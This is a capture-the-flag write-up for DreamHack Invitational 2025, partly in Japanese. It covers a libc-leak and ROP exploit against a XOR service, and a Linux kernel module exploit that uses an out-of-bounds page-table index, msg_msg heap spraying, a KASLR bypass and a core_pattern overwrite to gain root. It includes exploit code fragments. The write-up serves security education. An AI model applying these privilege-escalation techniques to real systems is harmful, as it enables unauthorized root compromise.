+++
title = "Writeup of DreamHack Invitational 2025"
date = 2025-04-09
description = "Brief writeup of DreamHack Invitational 2025"
[taxonomies]
tags = ["pwn", "kernel", "heap", "ROP"]
+++

# xoronly

stack上に無限に書き込むことができます。書き込みは既にある値とxorが取られれます。xor後の文字列は`puts`されます。

## challenge

```c
int main()
{
    char buf[0x100] = {0,};

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    puts("Welcome to the XOR-only encryption service!");
    puts("We will encrypt your data with a single byte key.");
    puts("Please enter your data");

    while(1)
    {
        printf("> ");

        for(int i=0;; i++)
        {
            char c = getchar();
            if(c == '\n')
            {
                buf[i] = 0;
                break;
            }
            if(!isalnum(c))
            {
                puts("Invalid character detected!");
                return 0;
            }
            buf[i] ^= c;
        }

        printf("Here is your encrypted data: ");
        puts(buf);
    }
}
```

## exploit

### aslr leak

`__libc_start_main`のアドレスを`puts(buf)`でleakします。

### ROP

`[0x00, 0-9, A-z]`が入力できて、xorすることができるので、`0 - 0x7f`までの任意の数値を作り出せます。
後はlibcのアドレスが`0x00 - 0x7f`までで構成されるアドレスになるまで接続を繰り返すことで、`pop rdi; system`のROPをします。

# kidheap

WIP

# ainque

The provided kernel module can load riscv ELF binary and run it in kernel context.

## vulnerability

`pml4e_index` has no validation. It can exceed 0x200, which cause OOB access. \

```c
static QCPU_EXIT_TYPE write_memory(qvm_t *qvm, uint64_t va, uint64_t size, uint64_t value, bool is_signed) {
    for(int i=0; i<size; i++) {
        qcpu_pte_or_fail pte_safe = qcpu_get_pte_from_va_failsafe(qvm->qcpu.cr3, va+i);
        if(pte_safe.success) {
            ((uint8_t *)PTE_TO_PHYS(pte_safe.pte))[(va+i) & 0xfff] = (uint8_t)((value >> (i*8)) & 0xff);
        } else {
            return QCPU_SIGSEGV;
        }
    }
    return QCPU_CONTINUE;
}
```

```c
qcpu_pte_or_fail qcpu_get_pte_from_va_failsafe(qcpu_pte_t ****cr3, uint64_t va) {
    qcpu_pte_t ***pml4e = qcpu_get_pml4e(cr3, va >> 39);
// the following omitted

qcpu_pte_t ***qcpu_get_pml4e(qcpu_pte_t ****cr3, uint64_t pml4e_index)
{
    return cr3[pml4e_index];
}
```

## exploit

### kaslr bypass

The basic strategy is spraying `msg_msg` and use it as `cr3`.
`msg_msg` has `list_head` member, which has a valid pointer, they can be used as `pml4e` or `pdpe`.

We can leak kbase by reading IDT region, which is located at fixed virtual address.

```c
  // VM side
  unsigned long gate = *(long *)PTI_TO_VIRT(0x2000 + 1, 1, 0, 6, 0) >> 52;
  unsigned long kbase_diff = gate - 0x820;
```

To load crafted value as `pml4e`, spray a bunch of `msg_msg` struct after `QVM_LOAD`. It contains the all possible pointer (0x200) pointing to `&core_pattern` considering KASLR.

```c
  // Host side
  rep(i, 0x1f8) {
    ((unsigned long *)msg_buf.mtext)[i + 1] =
    0xfffffffflu * 0x100000
    | (i + 0x82blu) * 0x100lu  // KASLR bypass
    | 0x7b
    | (0x8000000000000000l);
  }
```

{{ image(path="static/pagetable.png", caption="IDT address and all possible kbase address") }}

### core_pattern overwrite

By writing `|/tmp/xd` into `core_pattern` and causing crash, the kernel executes `/tmp/xd` as root.

```c
  // VM side
  *(long *)PTI_TO_VIRT(0x2000 + 1, 1, 0, 7 + kbase_diff & 0xfff, 0xc20) =
      0x64782f706d742f7c; // |/tmp/xd
```
